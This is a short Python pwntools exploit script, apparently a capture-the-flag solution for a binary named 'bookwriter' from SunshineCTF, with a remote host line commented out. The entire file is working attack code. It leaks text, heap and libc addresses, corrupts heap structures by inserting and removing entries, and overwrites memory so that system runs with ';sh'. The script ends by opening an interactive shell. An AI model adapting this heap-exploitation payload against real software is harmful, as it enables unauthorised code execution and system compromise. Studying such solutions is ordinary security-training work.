from pwn import *

#r = process(["./bookwriter"],env={"LD_PRELOAD":"./bookwriter-libc.so"})

r = process(["./bookwriter"])
#r = remote("chal1.sunshinectf.org", 20002)

def flep_pre():
	r.sendlineafter(">","1")
def flep_next():
	r.sendlineafter(">","2")

def insert(content):
	r.sendlineafter(">","3")
	r.sendlineafter("END",content)
	r.sendline("END")

def remove():
	r.sendlineafter(">","4")





r.recvuntil("number ")
text = int(r.recvuntil(":")[:-1])-0x26e0
print hex(text)

insert("joker")
remove()
insert(p32(text+0x26c8))
flep_pre()
r.recvline()
r.recvuntil(" number ")
heap = int(r.recvuntil(":")[:-1])
r.recvline()
print hex(heap)
r.recvline()

libc = u32(r.recv(4))-0x18540
r.recvline()
print hex(libc)
print hex(libc+0x1b2768)


ret = text+0xfa2
system = libc+0x003ada0

insert("a"*10)
insert("a"*10)
insert("joke")
insert("a"*10)
flep_pre()
remove()
insert(p32(heap)+p32(libc+0x1b38e0-0x8)+"\x00")
flep_pre()
remove()
target = text+0x267b

flep_next()

insert("a"*0x48)
insert("a"*0x48)
insert("a"*0x48)
insert("a"*0x48)
insert("a"*0x48)



flep_pre()
flep_pre()
remove()
flep_next()
remove()
flep_next()
insert("joker")
insert("joker")
insert("joker")
remove()
insert(p32(heap+0x128+0x8)+'\x00')
flep_pre()
remove()
insert(p32(target).ljust(0x48,"a"))
insert("a"*0x48)
insert("a"*0x48)
system = libc+0x3ada0
ret = text+0xfa2
insert(("a"*0xd+p32(system)*5+p32(ret)).ljust(0x44,"a")+";sh\x00")
r.interactive()
